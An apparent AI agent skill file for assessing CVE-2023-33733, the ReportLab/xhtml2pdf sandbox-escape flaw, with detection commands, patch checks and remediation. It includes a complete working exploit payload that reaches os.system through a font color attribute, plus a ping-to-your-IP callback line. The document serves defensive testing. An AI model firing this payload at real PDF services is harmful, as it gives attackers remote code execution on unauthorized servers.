---
name: reportlab-cve-2023-33733-assessment
description: Security assessment skill for identifying and testing CVE-2023-33733 (ReportLab/xhtml2pdf RCE vulnerability) in authorized environments. Use this skill when you need to assess PDF generation systems for this specific sandbox escape vulnerability, verify patch status, or validate remediation. Only use on systems you own or have explicit authorization to test.
---

# ReportLab CVE-2023-33733 Security Assessment

## Authorization Required

⚠️ **This skill is for authorized security testing only.** Only use on:
- Systems you own
- Systems where you have explicit written authorization
- Your own penetration testing labs

Unauthorized use may violate laws and regulations.

## Overview

CVE-2023-33733 is a remote code execution vulnerability in ReportLab versions up to 3.6.12. The vulnerability exists in the `rl_safe_eval` function used by xhtml2pdf when rendering user-controlled HTML into PDFs. Triple-bracket expressions `[[[...]]]` in certain attributes are evaluated server-side, allowing sandbox escape through `__globals__` access.

## When to Use This Skill

Use this skill when:
- You need to assess if a PDF generation system is vulnerable to CVE-2023-33733
- You want to verify patch status on ReportLab installations
- You're validating remediation after applying patches
- You're conducting authorized penetration testing on web applications with HTML-to-PDF functionality
- You see `xhtml2pdf` or `ReportLab` in PDF metadata or HTTP responses

## Detection Methods

### 1. Identify ReportLab/xhtml2pdf Usage

Check if the target uses ReportLab or xhtml2pdf:

```bash
# Check PDF metadata
exiftool document.pdf | grep -i 'Producer\|Creator'

# Check HTTP response headers
curl -I https://target.com/export.pdf | grep -i 'ReportLab'

# Check installed packages
pip list | grep -i reportlab
```

### 2. Version Check

Vulnerable versions: ReportLab ≤ 3.6.12

```bash
python -c "import reportlab; print(reportlab.__version__)"
```

### 3. AST-Based Fix Verification

Check if the AST-based fix is present (3.6.13+):

```bash
python - <<'PY'
import inspect
from reportlab.lib import colors
src = inspect.getsource(colors.toColor)
print('AST-based toColor' if 'ast.parse' in src else 'rl_safe_eval still reachable')
PY
```

## Safe Testing Methodology

### Prerequisites

1. **Authorization**: Confirm you have explicit permission
2. **Isolation**: Test in isolated environment
3. **Monitoring**: Set up network monitoring to detect exploitation
4. **Documentation**: Log all testing activities

### Test Payload Structure

The vulnerability exploits triple-bracket expressions `[[[...]]]` in evaluated attributes like `color`:

```html
<font color="[[[EXPRESSION]]]">text</font>
```

### Verification Payload (Safe)

Use a harmless verification command to confirm vulnerability:

```html
<font color="[[[getattr(pow, Word('__globals__'))['os'].system('echo test > /tmp/vuln_check') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
```

### Network-Based Verification

For remote testing, use ICMP ping to your controlled IP:

```bash
# On your machine
sudo tcpdump -ni <interface> icmp

# Payload with your IP
system('ping -c 1 YOUR_IP')
```

## Remediation

### 1. Upgrade ReportLab

```bash
pip install --upgrade reportlab
```

Target version: 3.6.13 or later

### 2. Input Sanitization

Remove or sanitize triple-bracket expressions from user input:

```python
import re

def sanitize_reportlab_input(html):
    # Remove triple-bracket expressions
    return re.sub(r'\[\[\[.*?\]\]\]', '', html, flags=re.DOTALL)
```

### 3. Disable rl_safe_eval

For untrusted inputs, disable the vulnerable evaluator:

```python
from reportlab.rl_settings import rl_settings
rl_settings.toColorCanUse = 'rl_extended_literal_eval'
```

## Detection Signatures

### Network Monitoring

Watch for suspicious outbound connections during PDF generation:
- ICMP traffic from application servers
- Unexpected HTTP/HTTPS connections
- DNS queries to unknown domains

### Log Analysis

Look for:
- PDF generation errors with triple-bracket patterns
- Unusual command execution patterns
- Failed authentication attempts during PDF export

## Distribution Backports

Some distributions ship backported fixes while keeping version numbers like `3.6.12-1+deb12u1`. Do not rely on semantic version alone. Check for `ast.parse` in `colors.py` or inspect `toColor` at runtime.

## References

- [CVE-2023-33733 NVD Entry](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- [ReportLab 3.6.13 Release Notes](https://docs.reportlab.com/releases/notes/whats-new-3613/)
- [Debian Security Tracker](https://security-tracker.debian.org/tracker/CVE-2023-33733)
- [xhtml2pdf Documentation](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

## Legal Disclaimer

This skill is provided for educational and authorized security testing purposes only. The author and Anthropic are not responsible for any misuse of this information. Always obtain proper authorization before testing any system.
